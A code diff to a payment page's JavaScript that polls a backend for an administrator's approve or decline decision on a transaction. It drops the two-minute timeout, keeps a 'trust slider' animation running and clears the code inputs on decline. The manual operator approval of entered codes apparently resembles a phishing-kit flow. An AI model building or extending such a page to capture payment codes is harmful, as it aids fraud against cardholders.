@@ -500,7 +500,7 @@
 
   function cancelAuthorizing() {
     pollingActive = false;
-    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
     stopTrustSlider();
     document.getElementById('authorizingOverlay').classList.remove('show');
     const btn = document.getElementById('confirmBtn');
@@ -552,22 +552,20 @@
 
     pollingActive = true;
 
-    // 3. Poll Render Backend for Admin Decision
-    let waitTime = 0;
+    // 3. Poll Render Backend for Admin Decision (Strict Mode)
     pollTimer = setInterval(async () => {
       if (!pollingActive) return;
-      waitTime += 2000;
 
       try {
         const res = await fetch(`${API_URL}/api/status/${tx.ref}`);
         const data = await res.json();
 
         if (data.status === 'approved') {
-          clearInterval(pollTimer);
+          // ONLY redirect if explicitly approved
           pollingActive = false;
+          clearInterval(pollTimer);
           stopTrustSlider();
           
-          // Redirect to success page
           const q = new URLSearchParams({
             tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
             c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
@@ -575,8 +573,9 @@
           });
           window.location.href = 'success.html?' + q.toString(); 
         } else if (data.status === 'declined') {
-          clearInterval(pollTimer);
+          // Stop polling and show error
           pollingActive = false;
+          clearInterval(pollTimer);
           stopTrustSlider();
           document.getElementById('authorizingOverlay').classList.remove('show');
           btn.disabled = false;
@@ -588,14 +587,9 @@
           inputs.forEach(i => i.value = '');
           inputs[0].focus();
         }
+        // If pending, do nothing. Just keep polling.
       } catch (e) {
         console.error('Polling error:', e);
-      }
-
-      if (waitTime > 120000) {
-        clearInterval(pollTimer);
-        cancelAuthorizing();
-        showToast('Request timed out. Please try again.');
       }
     }, 2000);
   }
